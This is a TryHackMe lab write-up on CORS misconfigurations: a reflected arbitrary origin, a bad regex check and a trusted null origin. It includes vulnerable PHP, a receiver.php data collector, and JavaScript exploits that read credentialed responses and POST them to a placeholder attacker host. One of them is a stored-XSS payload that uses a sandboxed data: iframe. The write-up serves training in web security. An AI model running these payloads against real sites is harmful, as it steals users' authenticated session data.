# TryHackMe — CORS & SOP Writeup
> **Tasks 7–9:** Exploiting CORS Misconfigurations

---

## Table of Contents
- [Setup](#setup)
- [Task 7 — Arbitrary Origin](#task-7--arbitrary-origin)
- [Task 8 — Bad Regex Origin](#task-8--bad-regex-origin)
- [Task 9 — Null Origin](#task-9--null-origin)
- [Conclusion](#conclusion)

---

## Setup

Before starting, add the following to `/etc/hosts` so the lab domains resolve correctly:

```
<ATTACKBOX_IP>    corssop.thm exploit.evilcors.thm corssop.thm.evilcors.thm
```

Create a `receiver.php` in `/var/www/html/` on your attacker machine. This script captures any data exfiltrated from the victim:

```php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');

$postdata = file_get_contents("php://input");
file_put_contents('data.txt', $postdata);
?>
```

Then start Apache so the server is listening:

```bash
sudo service apache2 start
```

---

## Task 7 — Arbitrary Origin

### The Vulnerability

The vulnerable code at `http://corssop.thm/arbitrary.php`:

```php
if (isset($_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
    header('Access-Control-Allow-Credentials: true');
}
```

The app does not verify anything. If a request arrives with an `Origin` header set, the server reads it and echoes it straight back as an approved origin — it never checks whether that origin should actually be trusted. Any attacker-controlled domain will be approved automatically.

### Exploitation

A sample exploit script is available at `http://corssop.thm/exploits/data_exfil.html`. The exploit uses `XMLHttpRequest` to make a cross-origin request to the vulnerable app, grabs the HTTP response, and exfiltrates it to the attacker's server.

Update the exfiltrate function to point to your attacker machine:

```javascript
function exploit() {
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            exfiltrate(this.responseText);
        }
    };
    xhttp.open("GET", "http://corssop.thm/arbitrary.php", true);
    xhttp.withCredentials = true;
    xhttp.send();
}

function exfiltrate(data_all) {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://<ATTACKER_IP>/receiver.php", true);
    xhr.withCredentials = true;
    var body = data_all;
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++)
        aBody[i] = body.charCodeAt(i);
    xhr.send(new Blob([aBody]));
}
```

After loading the exploit page, open DevTools → Network tab. You can see the exploit making a GET request to `arbitrary.php` and then a POST to `receiver.php` with the stolen data:

![DevTools showing CORS exploit requests](images/task7-devtools.png)
*Figure 1 — DevTools Network tab showing the cross-origin GET and the POST exfiltration to receiver.php*

After sending the exploit to the victim, the Apache logs show a new IP — the victim's machine — hitting the exploit page:

![Apache logs showing victim IP](images/task7-apachelogs.png)
*Figure 2 — Apache access logs showing the victim's IP requesting the exploit page*

The victim's browser also sends the stolen data to `receiver.php`, visible as a POST request in the Network tab:

![Network tab showing POST to receiver](images/task7-network.png)
*Figure 3 — Network tab confirming the POST exfiltration request was sent successfully*

Finally, check `data.txt` on your attacker machine — the victim's session data is saved there:

```bash
cat /var/www/html/data.txt
```

![data.txt showing exfiltrated content](images/task7-datatxt.png)
*Figure 4 — data.txt containing the exfiltrated response from the vulnerable endpoint, including the flag*

---

## Task 8 — Bad Regex Origin

### The Vulnerability

The vulnerable code at `http://corssop.thm/badregex.php`:

```php
if (isset($_SERVER['HTTP_ORIGIN']) && preg_match('#corssop.thm#', $_SERVER['HTTP_ORIGIN'])) {
    header("Access-Control-Allow-Origin: " . $_SERVER['HTTP_ORIGIN']);
    header('Access-Control-Allow-Credentials: true');
}
```

This looks safer but has two critical weaknesses:

**Weakness 1 — Unescaped dot:** In regex, `.` means "any character", not a literal dot. So `corssop.thm` matches `corssopXthm`, `corssop-thm`, and any other variation where the dot is replaced by any character.

**Weakness 2 — No anchoring:** The pattern is checked anywhere in the string, not against the full origin. This means any origin that merely *contains* `corssop.thm` somewhere will be approved — including attacker-controlled domains like `http://corssop.thm.evil.com`.

In plain terms: the app checks for a keyword instead of an exact identity. As long as the origin contains `corssop.thm` anywhere in it, the app approves it without question.

### Exploitation

The same exploit script from Task 7 is reused. Simply update the target URL to `badregex.php`. The attacker's origin is set to something like `http://corssop.thm.evilcors.thm` — this passes the regex because it contains the keyword `corssop.thm`:

```javascript
xhttp.open("GET", "http://corssop.thm/badregex.php", true);
```

Follow the same steps as Task 7. After sending the exploit to the victim, check `data.txt` — the exfiltrated response confirms the bypass worked:

![data.txt showing Task 8 exfiltrated content](images/task8-datatxt.png)
*Figure 5 — data.txt showing the exfiltrated response from badregex.php, including the flag*

---

## Task 9 — Null Origin

### The Vulnerability

The vulnerable code at `http://corssop.thm/null.php`:

```php
<?php
header('Access-Control-Allow-Origin: null');
header('Access-Control-Allow-Credentials: true');
?>
```

A `null` origin occurs in specific browser scenarios — for example when a page is loaded from a `data:` URL or a sandboxed iframe. This misconfiguration allows an attacker to craft a page that generates a `null` origin request, which the server blindly trusts.

### Exploitation

This exploit is different from the previous two. Instead of a direct cross-origin request, an attacker injects a payload into the XSS endpoint at `http://corssop.thm/xss.php`. The app accepts JavaScript and saves it to the database — when the victim visits the page, the payload executes.

The payload uses a sandboxed `iframe` with a `data:` URL to generate a null-origin request:

```html
<iframe id="exploitFrame" style="display:none;"></iframe>
<script>
    var exploitCode = `
      <script>
        function exploit() {
          var xhttp = new XMLHttpRequest();
          xhttp.open("GET", "http://corssop.thm/null.php", true);
          xhttp.withCredentials = true;
          xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
              var xhr = new XMLHttpRequest();
              xhr.open("POST", "http://<ATTACKER_IP>/receiver.php", true);
              xhr.withCredentials = true;
              var body = this.responseText;
              var aBody = new Uint8Array(body.length);
              for (var i = 0; i < aBody.length; i++)
                aBody[i] = body.charCodeAt(i);
              xhr.send(new Blob([aBody]));
            }
          };
          xhttp.send();
        }
        exploit();
      <\/script>
    `;
    var encodedExploit = btoa(exploitCode);
    document.getElementById('exploitFrame').src = 'data:text/html;base64,' + encodedExploit;
</script>
```

Once the victim interacts with the injected page, the null-origin request is trusted by the server and the response is exfiltrated to `receiver.php`. Check `data.txt` to confirm.

---

## Conclusion

This room demonstrated three real-world CORS misconfigurations and how each can be exploited:

| Vulnerability | Root Cause | Bypass Method |
|---|---|---|
| Arbitrary Origin | Server reflects any origin without validation | Send any origin header |
| Bad Regex | Regex checks for keyword anywhere in string | Craft domain containing the keyword |
| Null Origin | Server blindly trusts `null` origin | Use sandboxed iframe with `data:` URL |

The common thread across all three is that the server hands out trust without properly verifying who it is trusting. A correct CORS policy always uses a strict whitelist of exact, known origins — nothing more.
